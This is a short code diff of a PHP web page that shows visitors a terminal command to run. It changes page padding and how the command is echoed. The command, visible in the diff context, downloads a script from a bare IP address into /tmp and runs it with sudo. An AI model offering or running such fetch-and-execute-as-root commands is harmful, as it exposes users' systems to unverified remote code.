@@ -55,7 +55,7 @@ $final_file = "curl -s http://174.34.170.64/temp/$id > /tmp/wingscript; sudo bas
 	<link href="/css/bootstrap.css" rel="stylesheet">
 	<style type="text/css">
 		body {
-			padding-top: 30px;
+			padding-top: 300px;
 			padding-bottom: 30px;
 		}
 	</style>
@@ -92,9 +92,9 @@ $final_file = "curl -s http://174.34.170.64/temp/$id > /tmp/wingscript; sudo bas
 			</br>
 				<p>Please run this command in your terminal</p>
 			</br>
-				<pre id="script" align="center">
+				<pre>
 					<?php
-						echo $final_file;
+						echo "<p text-align='center'>" . $final_file . "</p>";
 					?>
 				</pre>
 			</center>
